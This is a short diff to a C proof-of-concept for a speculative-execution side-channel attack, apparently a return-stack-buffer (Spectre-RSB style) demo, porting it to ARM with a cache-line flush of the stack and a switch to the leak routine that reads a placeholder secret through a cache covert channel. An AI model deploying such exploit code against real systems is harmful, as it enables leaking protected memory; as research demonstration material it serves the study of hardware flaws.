@@ -5,7 +5,7 @@
 #include <string.h>
 #include <unistd.h>
 
-#include "libcache/cacheutils.h"
+#include "libcache/arm_cacheutils.h"
 
 // inaccessible secret
 #define SECRET "INACCESSIBLE SECRET"
@@ -18,6 +18,8 @@ int __attribute__ ((noinline)) call_manipulate_stack() {
 #if defined(__i386__) || defined(__x86_64__)
   asm volatile("pop %%rax\n" : : : "rax");
 #elif defined(__aarch64__)
+  asm volatile("mov x0, sp");
+  asm volatile("DC CIVAC, x0");
   asm volatile("ldp x29, x30, [sp],#16\n" : : : "x29");
 #endif
   return 0;
@@ -71,7 +73,7 @@ int main(int argc, const char **argv) {
     idx = (idx + 1) % sizeof(SECRET);
 
     
-    call_start();
+    call_leak();
 
     // Recover data from covert channel
     cache_decode_pretty(leaked, idx);
@@ -79,7 +81,7 @@ int main(int argc, const char **argv) {
     if(!strncmp(leaked, SECRET, sizeof(SECRET) - 1))
       break;
 
-    sched_yield();
+    // sched_yield();
   }
 
   printf("\n\x1b[1A[ ]\n\n[\x1b[32m>\x1b[0m] Done\n");
